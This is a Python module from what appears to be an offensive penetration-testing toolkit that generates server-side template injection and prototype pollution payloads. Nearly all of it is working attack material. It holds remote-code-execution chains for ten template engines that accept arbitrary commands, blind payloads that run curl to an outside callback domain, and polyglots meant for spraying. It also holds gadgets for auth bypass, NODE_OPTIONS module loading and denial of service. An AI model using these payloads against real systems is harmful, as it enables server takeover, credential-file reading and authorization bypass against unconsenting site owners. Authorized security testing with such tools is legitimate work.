"""
ERR0RS Server-Side Template Injection (SSTI) + Prototype Pollution Engine
=========================================================================
Production-grade SSTI + JS prototype pollution module. Targets the most
common modern web template engines (Jinja2/Twig/Flask, Handlebars,
Pug/Jade, EJS, Velocity, Freemarker, Smarty, ERB, Lodash) plus
JavaScript prototype pollution gadget chains.

Capabilities:
  • detection_payloads()      — engine fingerprinting via math/string ops
  • identify_engine()         — given a response, name the template engine
  • rce_payloads()            — engine-specific RCE chains (default: id/whoami)
  • blind_dns_payloads()      — out-of-band detection via DNS callback
  • prototype_pollution_payloads()  — __proto__/constructor.prototype gadgets
  • polyglot_payloads()       — payloads that fire on multiple engines
  • auto_payloads()           — full battery for unknown-engine targets

Philosophy:
  This module DOES NOT make network calls. It builds payloads.
  The orchestrator delivers them through the authorization gate.
  Default RCE payloads are non-destructive PoCs (id, whoami, /etc/passwd).
  Operator can supply destructive payloads explicitly via params.

Author: Gary Holden Schneider (Eros) | Sprint 03
"""

from __future__ import annotations

import json
import re
from dataclasses import dataclass, field
from typing import Optional


# ── Data structures ───────────────────────────────────────────────────────

@dataclass
class TemplatePayload:
    """A single SSTI / prototype-pollution payload."""
    technique:      str       # ssti_detection | ssti_rce | proto_pollution | polyglot | blind_dns
    engine:         str       # jinja2 | twig | handlebars | pug | ejs | smarty | erb | velocity | freemarker | lodash | nodejs | unknown
    severity:       str       # critical | high | medium | low | info
    description:    str
    location:       str       # body | query_param | header | path
    payload:        str       # the actual injection string
    expected_marker: Optional[str] = None   # what successful exec returns (e.g. "uid=" for id command)
    body:           Optional[dict] = None
    query_string:   Optional[str] = None
    method:         str = "POST"
    extras:         dict = field(default_factory=dict)


@dataclass
class EngineFingerprint:
    """Identification of a specific template engine from response body."""
    engine:     str
    confidence: str           # high | medium | low
    indicator:  str           # what we matched
    detail:     str = ""


# ── Engine fingerprinting ─────────────────────────────────────────────────

# When we send {{7*7}} we get back 49 — but that fingerprint alone matches
# many engines. To disambiguate, we send engine-specific syntax that ONLY
# one engine will execute. The response distinguishes them.

# These are the discriminator probes — each pair (payload, expected) tells
# us if a SPECIFIC engine is in use.
ENGINE_DISCRIMINATORS: dict[str, list[tuple[str, str]]] = {
    "jinja2": [
        # Jinja2 unique: config/self/cycler exposed
        ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "uid="),
        ("{{7*'7'}}",                                    "7777777"),  # Jinja repeats
        ("{{cycler.__init__.__globals__.os.popen('id').read()}}", "uid="),
    ],
    "twig": [
        # Twig: same {{}} but different filter syntax
        ("{{7*'7'}}",                                    "49"),       # Twig multiplies
        ("{{'a'|upper}}",                                "A"),
        ("{{['id']|filter('system')}}",                  "uid="),
    ],
    "handlebars": [
        # Handlebars: doesn't eval math by default — needs helper subversion
        ("{{#with \"s\" as |string|}}{{#with \"e\"}}"
         "{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}"
         "{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}"
         "{{this.push \"return require('child_process').execSync('id');\"}}"
         "{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}"
         "{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",       "uid="),
    ],
    "pug": [
        # Pug/Jade: indentation-based — RCE via #{} interpolation
        ("#{global.process.mainModule.require('child_process').execSync('id').toString()}", "uid="),
        ("- var x = global.process.mainModule.require('child_process').execSync('id'); = x", "uid="),
    ],
    "ejs": [
        # EJS: <%= %> and <% %>
        ("<%= global.process.mainModule.require('child_process').execSync('id') %>", "uid="),
        ("<% global.process.mainModule.require('child_process').execSync('id') %>",  ""),
    ],
    "smarty": [
        # Smarty 3: {} delimiters, php tag long deprecated but {math} still works
        ("{$smarty.version}",                            "Smarty"),
        ("{system('id')}",                               "uid="),
        ("{php}echo `id`;{/php}",                        "uid="),
    ],
    "erb": [
        # Ruby ERB: <%= %>
        ("<%= 7*7 %>",                                   "49"),
        ("<%= `id` %>",                                  "uid="),
        ("<%= system('id') %>",                          "uid="),
    ],
    "velocity": [
        # Java Velocity (#set, #if, $variable)
        ("#set($x=7*7)$x",                               "49"),
        ("#set($e=\"e\")$e.getClass().forName(\"java.lang.Runtime\")"
         ".getMethod(\"exec\",$e.getClass()).invoke("
         "$e.getClass().forName(\"java.lang.Runtime\")"
         ".getMethod(\"getRuntime\").invoke(null),\"id\")", "Process"),
    ],
    "freemarker": [
        # Java Freemarker (${}, <#assign>)
        ("${7*7}",                                       "49"),
        ('<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}', "uid="),
    ],
    "lodash": [
        # Lodash _.template — node.js side
        ("<%= 7*7 %>",                                   "49"),
        ("<%= global.process.mainModule.require('child_process').execSync('id') %>", "uid="),
    ],
}


# Initial detection probes — these are universal markers that say
# "SOMETHING is interpreting this template syntax"
_DETECTION_PROBES = [
    # (payload, expected_in_response, candidate_engines)
    ("${{7*7}}",            "49",       ["unknown"]),
    ("{{7*7}}",             "49",       ["jinja2", "twig", "handlebars-helper"]),
    ("${7*7}",              "49",       ["freemarker", "velocity", "thymeleaf"]),
    ("<%= 7*7 %>",          "49",       ["erb", "ejs", "lodash"]),
    ("#{7*7}",              "49",       ["pug", "ruby-string-interp"]),
    ("{7*7}",               "49",       ["smarty"]),
    ("@{7*7}",              "49",       ["razor"]),
    ("[[${7*7}]]",          "49",       ["thymeleaf"]),
]


def _engine_specific_response_signatures() -> dict[str, list[re.Pattern]]:
    """Patterns that, when seen in a server error/response, identify the engine."""
    return {
        "jinja2": [
            re.compile(r"jinja2\.exceptions",            re.I),
            re.compile(r"TemplateSyntaxError",            re.I),
            re.compile(r"UndefinedError",                 re.I),
        ],
        "twig": [
            re.compile(r"Twig_Error",                     re.I),
            re.compile(r"Twig\\Error",                    re.I),
        ],
        "handlebars": [
            re.compile(r"Handlebars",                     re.I),
            re.compile(r"Parse error on line",            re.I),
        ],
        "pug": [
            re.compile(r"pug:",                           re.I),
            re.compile(r"jade:",                          re.I),
        ],
        "ejs": [
            re.compile(r"ejs",                            re.I),
            re.compile(r"Cannot read prop.*template",     re.I),
        ],
        "smarty": [
            re.compile(r"Smarty error",                   re.I),
            re.compile(r"SmartyException",                re.I),
        ],
        "erb": [
            re.compile(r"\(erb\):",                       re.I),
            re.compile(r"ActionView::Template",           re.I),
        ],
        "velocity": [
            re.compile(r"org\.apache\.velocity",          re.I),
            re.compile(r"VelocityException",              re.I),
        ],
        "freemarker": [
            re.compile(r"FreeMarker template error",      re.I),
            re.compile(r"freemarker\.core",               re.I),
        ],
        "lodash": [
            re.compile(r"Lodash",                         re.I),
        ],
    }


def identify_engine(response_text: str) -> list[EngineFingerprint]:
    """
    Look at a response (typically an error) and decide which template engine
    is producing it. Returns list of fingerprints in confidence order.
    """
    out: list[EngineFingerprint] = []
    text = response_text or ""

    for engine, patterns in _engine_specific_response_signatures().items():
        for pat in patterns:
            m = pat.search(text)
            if m:
                out.append(EngineFingerprint(
                    engine=engine,
                    confidence="high",
                    indicator=m.group(0),
                    detail=f"Engine fingerprint matched: {pat.pattern!r}",
                ))
                break  # one match per engine is enough

    return out


# ── Detection payloads ────────────────────────────────────────────────────

def detection_payloads(*,
                       location: str = "body",
                       target_field: str = "q",
                       endpoint: str = "/",
                       method: str = "POST") -> list[TemplatePayload]:
    """
    Build the universal detection battery — math expressions in every
    common template syntax. The orchestrator delivers each, observes which
    one returns "49" in the response, and concludes which engine family.
    """
    out: list[TemplatePayload] = []
    for payload_str, expected, engines in _DETECTION_PROBES:
        engine_label = engines[0] if len(engines) == 1 else "/".join(engines[:3])
        body = {target_field: payload_str} if location == "body" else None
        qs   = f"{target_field}={payload_str}" if location == "query_param" else None
        out.append(TemplatePayload(
            technique="ssti_detection",
            engine=engine_label,
            severity="info",
            description=f"SSTI math-eval probe ({engine_label}): {payload_str!r}",
            location=location,
            payload=payload_str,
            expected_marker=expected,
            body=body,
            query_string=qs,
            method=method,
            extras={"path": endpoint, "candidate_engines": engines},
        ))
    return out


# ── RCE payloads ──────────────────────────────────────────────────────────

# Default safe-PoC commands — non-destructive system info
SAFE_COMMANDS = {
    "linux":   "id",
    "windows": "whoami",
    "passwd":  "cat /etc/passwd",
    "version": "uname -a",
}


def rce_payloads(*,
                 engine: str,
                 command: str = "id",
                 location: str = "body",
                 target_field: str = "q",
                 endpoint: str = "/",
                 method: str = "POST") -> list[TemplatePayload]:
    """
    Generate engine-specific RCE chains. Default `command` is `id` —
    non-destructive PoC. Operator may pass custom command via params.

    Returns one or more payload variants per engine because no single
    chain works in all environments (sandbox bypass varies by version).
    """
    out: list[TemplatePayload] = []
    engine_l = engine.lower()

    # Each entry is (template, severity, description)
    chains: dict[str, list[tuple[str, str, str]]] = {
        "jinja2": [
            ("{{config.__class__.__init__.__globals__['os'].popen('CMD').read()}}",
             "critical", "Jinja2 RCE via config.__globals__.os.popen"),
            ("{{cycler.__init__.__globals__.os.popen('CMD').read()}}",
             "critical", "Jinja2 RCE via cycler globals"),
            ("{{request.application.__globals__.__builtins__.__import__('os').popen('CMD').read()}}",
             "critical", "Jinja2 RCE via request.application globals"),
            ("{{''.__class__.__mro__[1].__subclasses__()[401]"
             "('CMD',shell=True,stdout=-1).communicate()[0]}}",
             "critical", "Jinja2 RCE via subclass walking (subprocess.Popen at index 401)"),
            ("{{lipsum.__globals__.os.popen('CMD').read()}}",
             "critical", "Jinja2 RCE via lipsum globals"),
        ],
        "twig": [
            ("{{['CMD']|filter('system')}}",
             "critical", "Twig RCE via filter+system"),
            ("{{['CMD']|map('system')|join}}",
             "critical", "Twig RCE via map+system"),
            ("{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('CMD')}}",
             "critical", "Twig RCE via registerUndefinedFilterCallback"),
        ],
        "handlebars": [
            # Classic handlebars RCE — long, but reliable
            ("{{#with \"s\" as |string|}}{{#with \"e\"}}"
             "{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}"
             "{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}"
             "{{this.push \"return require('child_process').execSync('CMD');\"}}"
             "{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}"
             "{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
             "critical", "Handlebars RCE via constructor.split.apply chain"),
        ],
        "pug": [
            ("- var output = global.process.mainModule.require('child_process').execSync('CMD').toString();\n= output",
             "critical", "Pug RCE via global.process.mainModule"),
            ("#{global.process.mainModule.require('child_process').execSync('CMD').toString()}",
             "critical", "Pug RCE via interpolation"),
        ],
        "ejs": [
            ("<%= global.process.mainModule.require('child_process').execSync('CMD').toString() %>",
             "critical", "EJS RCE via global.process.mainModule"),
            # The classic EJS settings.outputFunctionName trick
            ("settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('CMD');//",
             "critical", "EJS RCE via outputFunctionName injection (CVE-2022-29078 family)"),
        ],
        "smarty": [
            ("{system('CMD')}",
             "critical", "Smarty RCE via system() function"),
            ("{php}echo `CMD`;{/php}",
             "critical", "Smarty RCE via {php} block (Smarty 2.x and unsafe Smarty 3)"),
            ("{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru('CMD'); ?>\",self::clearConfig())}",
             "critical", "Smarty 3 RCE via Smarty_Internal_Write_File"),
        ],
        "erb": [
            ("<%= `CMD` %>",
             "critical", "ERB RCE via backticks"),
            ("<%= system('CMD') %>",
             "critical", "ERB RCE via system()"),
            ("<%= IO.popen('CMD').read() %>",
             "critical", "ERB RCE via IO.popen"),
        ],
        "velocity": [
            ("#set($e=\"e\")$e.getClass().forName(\"java.lang.Runtime\")"
             ".getMethod(\"exec\",$e.getClass()).invoke("
             "$e.getClass().forName(\"java.lang.Runtime\")"
             ".getMethod(\"getRuntime\").invoke(null),\"CMD\")",
             "critical", "Velocity RCE via Runtime.exec reflection"),
        ],
        "freemarker": [
            ('<#assign x="freemarker.template.utility.Execute"?new()>${x("CMD")}',
             "critical", "Freemarker RCE via Execute utility"),
            ('${"freemarker.template.utility.ObjectConstructor"?new()'
             '("freemarker.template.utility.Execute").exec(["CMD"])}',
             "critical", "Freemarker RCE via ObjectConstructor"),
        ],
        "lodash": [
            ("<%= global.process.mainModule.require('child_process').execSync('CMD').toString() %>",
             "critical", "Lodash _.template RCE via global.process.mainModule"),
        ],
    }

    selected = chains.get(engine_l, [])
    if not selected and engine_l in ("unknown", "any"):
        # Throw the whole battery
        for chains_list in chains.values():
            selected.extend(chains_list)

    # Substitute the command placeholder
    for tpl, sev, desc in selected:
        injection = tpl.replace("CMD", command.replace("'", r"'\''"))  # rough escape
        body = {target_field: injection} if location == "body" else None
        qs   = f"{target_field}={injection}" if location == "query_param" else None
        out.append(TemplatePayload(
            technique="ssti_rce",
            engine=engine_l,
            severity=sev,
            description=f"{desc} (cmd: {command})",
            location=location,
            payload=injection,
            expected_marker="uid=" if command == "id" else None,
            body=body,
            query_string=qs,
            method=method,
            extras={"path": endpoint, "command": command, "chain": tpl},
        ))
    return out


# ── Blind DNS callback payloads ──────────────────────────────────────────

def blind_dns_payloads(*,
                       collaborator_domain: str,
                       location: str = "body",
                       target_field: str = "q",
                       endpoint: str = "/",
                       method: str = "POST") -> list[TemplatePayload]:
    """
    Out-of-band detection — when responses don't echo input, force the
    target to make a DNS lookup we control. The payloads embed a
    collaborator domain (Burp Collab, interactsh, your own DNS server)
    and the target's DNS query proves execution.

    Operator must supply collaborator_domain — we don't bake one in.
    """
    if not collaborator_domain or "." not in collaborator_domain:
        raise ValueError("collaborator_domain must be a real domain (e.g. abc123.oast.fun)")

    out: list[TemplatePayload] = []
    # Per-engine commands that resolve a DNS name via shell
    dns_cmds = {
        "jinja2":   "{{config.__class__.__init__.__globals__['os'].popen('curl http://CB').read()}}",
        "twig":     "{{['curl http://CB']|filter('system')}}",
        "ejs":      "<%= global.process.mainModule.require('child_process').execSync('curl http://CB') %>",
        "freemarker": '<#assign x="freemarker.template.utility.Execute"?new()>${x("curl http://CB")}',
        "smarty":   "{system('curl http://CB')}",
        "erb":      "<%= `curl http://CB` %>",
    }

    for engine, tpl in dns_cmds.items():
        injection = tpl.replace("CB", collaborator_domain)
        body = {target_field: injection} if location == "body" else None
        qs   = f"{target_field}={injection}" if location == "query_param" else None
        out.append(TemplatePayload(
            technique="blind_dns",
            engine=engine,
            severity="high",
            description=(f"Blind {engine} SSTI via DNS callback to "
                          f"{collaborator_domain}"),
            location=location,
            payload=injection,
            expected_marker=None,    # success = DNS hit at collaborator
            body=body,
            query_string=qs,
            method=method,
            extras={"path": endpoint, "collaborator": collaborator_domain},
        ))
    return out


# ── Polyglot payloads — fire on multiple engines at once ─────────────────

def polyglot_payloads(*,
                     command: str = "id",
                     location: str = "body",
                     target_field: str = "q",
                     endpoint: str = "/",
                     method: str = "POST") -> list[TemplatePayload]:
    """
    Single payloads designed to execute under MULTIPLE template engines.
    Useful when fingerprinting fails or you want to spray-and-pray during
    fast assessments.
    """
    cmd_esc = command.replace("'", r"'\''")
    chains = [
        # Jinja2 + Twig (both use {{}} but interpret differently — this works in both via different paths)
        ("{{['" + cmd_esc + "']|filter('system')}}",
         "twig+jinja2", "Polyglot for Twig (filter system) — gracefully ignored by Jinja2"),
        # Jinja2 + ERB (Jinja2 ignores the <% %>, ERB ignores the {{}})
        (f"{{{{7*'7'}}}}<%= `{cmd_esc}` %>",
         "jinja2+erb", "Polyglot for Jinja2 string-multiplication AND ERB backticks"),
        # Velocity + Freemarker (both use ${} but different syntax inside)
        ("${T(java.lang.Runtime).getRuntime().exec(\"" + cmd_esc + "\")}",
         "spel+velocity", "Spring Expression Language / Velocity polyglot via T() typecast"),
        # Universal probe-detect — fires math eval on any template engine
        ("${7*7}#{7*7}{{7*7}}<%= 7*7 %>{7*7}",
         "any", "Multi-syntax math probe — at least one of these will eval to 49"),
    ]

    out: list[TemplatePayload] = []
    for tpl, engine_label, desc in chains:
        body = {target_field: tpl} if location == "body" else None
        qs   = f"{target_field}={tpl}" if location == "query_param" else None
        out.append(TemplatePayload(
            technique="polyglot",
            engine=engine_label,
            severity="high",
            description=desc + f" (cmd: {command})",
            location=location,
            payload=tpl,
            expected_marker="uid=" if command == "id" else "49",
            body=body,
            query_string=qs,
            method=method,
            extras={"path": endpoint, "command": command},
        ))
    return out


# ── Prototype Pollution — JavaScript-side ────────────────────────────────

# Prototype pollution attacks pollute Object.prototype with attacker-controlled
# values. Vulnerable code that later checks Object properties (e.g. for auth,
# config, or template options) sees the polluted values and behaves unexpectedly.

# Three primary attack vectors:
#   1. JSON merge into __proto__: {"__proto__": {"isAdmin": true}}
#   2. URL query string with __proto__ bracket syntax: ?__proto__[isAdmin]=true
#   3. Constructor.prototype: {"constructor": {"prototype": {"isAdmin": true}}}

# Once polluted, the attacker can chain to RCE if the app uses certain libs:
#   - lodash _.template     → polluted "sourceURL" → RCE
#   - express handlebars    → polluted "outputFunctionName" → RCE
#   - require('child_process') with polluted args → RCE
#   - YAML.load with polluted "schema" → RCE

PROTO_POLLUTION_GADGETS = [
    # Auth bypass — flip isAdmin/role/authenticated globally
    {"key": "isAdmin",       "value": True,  "impact": "Auth bypass — every Object.isAdmin check returns true"},
    {"key": "admin",         "value": True,  "impact": "Auth bypass — admin checks pass"},
    {"key": "role",          "value": "admin", "impact": "RBAC bypass via role pollution"},
    {"key": "authenticated", "value": True,  "impact": "Authentication state flipped"},
    {"key": "isAuthorized",  "value": True,  "impact": "Authorization state flipped"},
    # RCE gadgets — depend on specific libraries being present
    {"key": "shell",         "value": "/bin/sh", "impact": "child_process.spawn shell override"},
    {"key": "env",           "value": {"NODE_OPTIONS": "--require /tmp/x.js"},
     "impact": "Node.js NODE_OPTIONS injection — loads attacker module on next child_process spawn"},
    {"key": "sourceURL",     "value": "x;return process.mainModule.require('child_process').execSync('id');//",
     "impact": "lodash _.template RCE via sourceURL pollution"},
    {"key": "outputFunctionName",
     "value": "x;process.mainModule.require('child_process').execSync('id');//",
     "impact": "EJS outputFunctionName RCE (CVE-2022-29078 family)"},
    # DoS gadgets
    {"key": "toString",      "value": 1,     "impact": "DoS — every .toString() throws TypeError"},
    {"key": "hasOwnProperty","value": False, "impact": "DoS — hasOwnProperty checks lie"},
]


def prototype_pollution_payloads(*,
                                  endpoint: str = "/",
                                  body_format: str = "json",   # json | urlencoded | querystring
                                  ) -> list[TemplatePayload]:
    """
    Generate the full prototype-pollution payload battery against an
    endpoint that likely does Object.assign() / lodash.merge() /
    JSON.parse() / Object spread on user input.

    body_format:
      - json:        POST {"__proto__": {"isAdmin": true}}
      - urlencoded:  __proto__[isAdmin]=true (form-encoded body)
      - querystring: ?__proto__[isAdmin]=true (URL params)
    """
    out: list[TemplatePayload] = []

    for gadget in PROTO_POLLUTION_GADGETS:
        key, value, impact = gadget["key"], gadget["value"], gadget["impact"]

        is_rce = "RCE" in impact or "shell" in impact or "execSync" in str(value)
        severity = "critical" if is_rce else "high"

        # Build payload in each of the three vectors
        # 1. JSON merge on __proto__
        json_body = {"__proto__": {key: value}}
        # 2. constructor.prototype variant
        ctor_body = {"constructor": {"prototype": {key: value}}}

        if body_format == "json":
            for body, vector in [(json_body, "__proto__"),
                                  (ctor_body, "constructor.prototype")]:
                out.append(TemplatePayload(
                    technique="proto_pollution",
                    engine="nodejs",
                    severity=severity,
                    description=f"Prototype pollution via {vector}.{key}={value!r}: {impact}",
                    location="body",
                    payload=json.dumps(body),
                    body=body,
                    method="POST",
                    extras={"path": endpoint, "vector": vector,
                            "gadget_key": key, "impact": impact},
                ))
        elif body_format == "urlencoded":
            qs_val = json.dumps(value) if not isinstance(value, str) else value
            for vector in ["__proto__", "constructor.prototype", "constructor%5Bprototype%5D"]:
                payload = f"{vector}[{key}]={qs_val}"
                out.append(TemplatePayload(
                    technique="proto_pollution",
                    engine="nodejs",
                    severity=severity,
                    description=f"Prototype pollution (urlencoded) via {vector}[{key}]: {impact}",
                    location="body",
                    payload=payload,
                    method="POST",
                    extras={"path": endpoint, "vector": vector,
                            "gadget_key": key, "impact": impact,
                            "content_type": "application/x-www-form-urlencoded"},
                ))
        elif body_format == "querystring":
            qs_val = json.dumps(value) if not isinstance(value, str) else value
            for vector in ["__proto__", "constructor.prototype"]:
                payload = f"{vector}[{key}]={qs_val}"
                out.append(TemplatePayload(
                    technique="proto_pollution",
                    engine="nodejs",
                    severity=severity,
                    description=f"Prototype pollution (querystring) via {vector}[{key}]: {impact}",
                    location="query_param",
                    payload=payload,
                    query_string=payload,
                    method="GET",
                    extras={"path": endpoint, "vector": vector,
                            "gadget_key": key, "impact": impact},
                ))
    return out


# ── Auto: full payload battery ────────────────────────────────────────────

class TemplateInjector:
    """
    Convenience facade — bundles every payload generator.
    """

    def __init__(self):
        pass

    def auto_payloads(self, *,
                       endpoint: str = "/",
                       target_field: str = "q",
                       command: str = "id",
                       collaborator_domain: Optional[str] = None,
                       include_proto_pollution: bool = True,
                       ) -> list[TemplatePayload]:
        """
        Return the full payload battery. The orchestrator delivers each
        and tracks which produced execution.
        """
        out: list[TemplatePayload] = []

        # Step 1: detection probes (one per syntax)
        out.extend(detection_payloads(endpoint=endpoint, target_field=target_field))

        # Step 2: RCE payloads for every engine (orchestrator picks based on
        # detection results, but we include all so a spray attack works too)
        for eng in ENGINE_DISCRIMINATORS.keys():
            out.extend(rce_payloads(engine=eng, command=command,
                                     endpoint=endpoint, target_field=target_field))

        # Step 3: Polyglots
        out.extend(polyglot_payloads(command=command, endpoint=endpoint,
                                       target_field=target_field))

        # Step 4: Blind DNS — only if collaborator supplied
        if collaborator_domain:
            out.extend(blind_dns_payloads(collaborator_domain=collaborator_domain,
                                            endpoint=endpoint, target_field=target_field))

        # Step 5: Prototype pollution (Node.js targets)
        if include_proto_pollution:
            out.extend(prototype_pollution_payloads(endpoint=endpoint, body_format="json"))
            out.extend(prototype_pollution_payloads(endpoint=endpoint, body_format="urlencoded"))
            out.extend(prototype_pollution_payloads(endpoint=endpoint, body_format="querystring"))

        return out

    def identify_engine(self, response_text: str) -> list[EngineFingerprint]:
        return identify_engine(response_text)


# Module singleton
_injector: Optional[TemplateInjector] = None
def get_injector() -> TemplateInjector:
    global _injector
    if _injector is None:
        _injector = TemplateInjector()
    return _injector


# ── CLI ───────────────────────────────────────────────────────────────────

def _cli():
    import argparse
    p = argparse.ArgumentParser(
        prog="python3 -m src.tools.web.template_injector",
        description="ERR0RS SSTI + Prototype Pollution engine",
    )
    sub = p.add_subparsers(dest="cmd", required=True)

    pdet = sub.add_parser("detect", help="Generate engine-detection probes")
    pdet.add_argument("--field", default="q")
    pdet.add_argument("--endpoint", default="/")

    pid = sub.add_parser("identify", help="Identify engine from a response body")
    pid.add_argument("--response", required=True,
                     help="Response body text (or @file to read from file)")

    prce = sub.add_parser("rce", help="Generate engine-specific RCE chains")
    prce.add_argument("--engine", required=True,
                      choices=list(ENGINE_DISCRIMINATORS.keys()) + ["unknown", "any"])
    prce.add_argument("--command", default="id")
    prce.add_argument("--field", default="q")
    prce.add_argument("--endpoint", default="/")

    pblind = sub.add_parser("blind", help="Blind DNS callback payloads")
    pblind.add_argument("--collaborator", required=True,
                        help="Collaborator domain like abc123.oast.fun")
    pblind.add_argument("--field", default="q")
    pblind.add_argument("--endpoint", default="/")

    ppoly = sub.add_parser("polyglot", help="Multi-engine polyglot payloads")
    ppoly.add_argument("--command", default="id")
    ppoly.add_argument("--field", default="q")

    pproto = sub.add_parser("proto", help="Prototype pollution payloads")
    pproto.add_argument("--format", default="json",
                        choices=["json", "urlencoded", "querystring"])
    pproto.add_argument("--endpoint", default="/")

    pauto = sub.add_parser("auto", help="Full payload battery")
    pauto.add_argument("--field", default="q")
    pauto.add_argument("--endpoint", default="/")
    pauto.add_argument("--command", default="id")
    pauto.add_argument("--collaborator", default=None)

    args = p.parse_args()

    inj = get_injector()

    def dump(payloads):
        out = [{
            "technique":   p.technique,
            "engine":      p.engine,
            "severity":    p.severity,
            "description": p.description,
            "method":      p.method,
            "location":    p.location,
            "payload":     p.payload,
            "expected_marker": p.expected_marker,
            "body":        p.body,
            "query_string": p.query_string,
            "extras":      p.extras,
        } for p in payloads]
        print(json.dumps(out, indent=2))

    if args.cmd == "detect":
        dump(detection_payloads(endpoint=args.endpoint, target_field=args.field))
    elif args.cmd == "identify":
        text = args.response
        if text.startswith("@"):
            with open(text[1:]) as f:
                text = f.read()
        fps = identify_engine(text)
        print(json.dumps([{"engine": f.engine, "confidence": f.confidence,
                           "indicator": f.indicator, "detail": f.detail}
                          for f in fps], indent=2))
    elif args.cmd == "rce":
        dump(rce_payloads(engine=args.engine, command=args.command,
                          endpoint=args.endpoint, target_field=args.field))
    elif args.cmd == "blind":
        dump(blind_dns_payloads(collaborator_domain=args.collaborator,
                                  endpoint=args.endpoint, target_field=args.field))
    elif args.cmd == "polyglot":
        dump(polyglot_payloads(command=args.command, target_field=args.field))
    elif args.cmd == "proto":
        dump(prototype_pollution_payloads(endpoint=args.endpoint, body_format=args.format))
    elif args.cmd == "auto":
        dump(inj.auto_payloads(endpoint=args.endpoint, target_field=args.field,
                                  command=args.command,
                                  collaborator_domain=args.collaborator))


if __name__ == "__main__":
    _cli()
